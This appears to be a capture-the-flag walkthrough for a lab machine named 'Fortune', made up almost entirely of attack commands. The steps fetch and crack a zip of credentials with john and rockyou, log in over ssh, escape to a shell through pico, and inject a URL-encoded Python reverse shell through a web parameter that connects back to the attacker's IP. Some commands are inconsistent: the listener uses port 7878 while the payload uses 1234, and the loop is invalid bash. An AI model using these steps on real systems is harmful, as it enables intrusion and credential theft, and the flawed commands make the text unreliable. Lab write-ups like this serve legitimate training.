# Fortune
# Fortuna Path
1. `nc fortune.thm 3333 | base64 -d > test.zip`
2. `zip2john test.zip > for_john`
3. `john for_john --wordlist=/usr/share/wordlists/rockyou.txt`
4. `unzip test.zip`
5. `cat creds.txt`
6. `ssh fortuna@fortune.thm`
```
nc fortune.thm 3333 | base64 -d > test.zip && zip2john test.zip > for_john && john for_john --wordlist=/usr/share/wordlists/rockyou.txt && unzip test.zip&& cat creds.txt
```
### Priv. Esc.
#### Method 1
1. `pico -s /bin/sh` type `/bin/sh` and `CTRL+T`
#### Method 2
1. `cd /home`
2.  `while True; do bash ./lucky_shell`
3. `gobuster dir -w ~/Desktop/wordlists/wordlistex2.txt -u http://fortune.thm` *optional*
4. `nc -nlvp 7878` on kali
5. http://fortune.thm/_styles/?luck=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22MYIP%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 on fortune



## Flags
1. /media/darts
2. /srv/blackjack
3. /lib/checkers
4. /usr/games/flag
5. /usr/local/games/flag
6. /geama/flag
7. /home/fortuna/Desktop/chess (thanks to mug3njutsu on discord for this)
